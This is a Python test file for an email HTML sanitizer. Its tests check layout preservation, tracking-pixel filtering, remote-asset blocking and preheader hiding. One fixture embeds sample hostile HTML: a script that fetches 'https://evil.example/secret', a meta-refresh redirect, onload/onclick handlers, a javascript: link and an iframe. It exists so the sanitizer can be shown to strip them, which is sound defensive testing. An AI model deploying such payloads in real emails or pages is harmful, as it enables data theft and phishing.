from __future__ import annotations

from mailbox_manager.mail.web_document import (
    prepare_email_web_document,
    sanitize_email_web_source,
    web_remote_image_urls,
)


def test_web_source_preserves_layout_but_removes_active_content() -> None:
    html = """
    <html><head>
      <meta http-equiv="refresh" content="0;url=https://evil.example">
      <style>.card { max-width: 600px; padding: 24px; color: #172033; }</style>
      <script>fetch('https://evil.example/secret')</script>
    </head><body onload="steal()">
      <table class="card" width="600" cellpadding="20" role="presentation">
        <tr><td style="font-size:16px;line-height:24px">
          <p>完整邮件正文</p>
          <a href="https://example.com/action" onclick="steal()">继续操作</a>
          <a href="javascript:steal()">危险链接</a>
        </td></tr>
      </table>
      <iframe src="https://evil.example/frame"></iframe>
    </body></html>
    """

    source = sanitize_email_web_source(html, remote_policy="preserve")

    assert ".card { max-width: 600px; padding: 24px" in source
    assert 'class="card"' in source
    assert 'width="600"' in source
    assert 'cellpadding="20"' in source
    assert "完整邮件正文" in source
    assert 'href="https://example.com/action"' in source
    assert "script" not in source.casefold()
    assert "iframe" not in source.casefold()
    assert "onload" not in source.casefold()
    assert "onclick" not in source.casefold()
    assert "javascript:" not in source.casefold()
    assert "http-equiv" not in source.casefold()


def test_web_images_ignore_tracking_pixel_and_embed_brand_image() -> None:
    html = """
    <img src="https://cdn.example.com/openai-logo.png" width="560" height="168">
    <img src="https://track.example.com/open.php" width="1" height="1">
    """

    assert web_remote_image_urls(html) == ("https://cdn.example.com/openai-logo.png",)
    source = sanitize_email_web_source(
        html,
        remote_images={"https://cdn.example.com/openai-logo.png": ("image/png", b"png")},
        remote_policy="embed",
    )
    document = prepare_email_web_document(source)

    assert "data:image/png;base64,cG5n" in document
    assert "maildesk-brand-image" in document
    assert "maildesk-tracking-pixel" in document
    assert "max-width: 220px" in document


def test_css_remote_assets_are_discovered_and_never_left_in_blocked_document() -> None:
    html = """
    <style>.hero { background-image:url('https://cdn.example.com/hero.png'); }</style>
    <div class="hero" style="background:url(https://cdn.example.com/card.jpg)">正文</div>
    """

    assert web_remote_image_urls(html) == (
        "https://cdn.example.com/hero.png",
        "https://cdn.example.com/card.jpg",
    )
    document = prepare_email_web_document(html, remote_policy="block")

    assert "https://cdn.example.com" not in document
    assert "正文" in document


def test_only_subject_matching_leading_preheader_is_hidden() -> None:
    source = "<div>Access deactivated</div><table><tr><td>完整正文</td></tr></table>"

    hidden = prepare_email_web_document(
        source,
        preheader_hint="OpenAI - Access Deactivated [case-id]",
    )
    visible = prepare_email_web_document(source, preheader_hint="另一封邮件")

    assert 'class="maildesk-preheader-hidden"' in hidden
    assert 'class="maildesk-preheader-hidden"' not in visible
    assert "完整正文" in hidden


def test_branded_table_preheader_is_hidden_when_provider_subject_differs() -> None:
    source = (
        "<div>邮件列表中的隐藏预览</div><table><tr><td>"
        '<img src="https://cdn.example.com/openai-logo.png">完整正文'
        "</td></tr></table>"
    )

    document = prepare_email_web_document(source, preheader_hint="不同的正式主题")

    assert 'class="maildesk-preheader-hidden"' in document
    assert "完整正文" in document
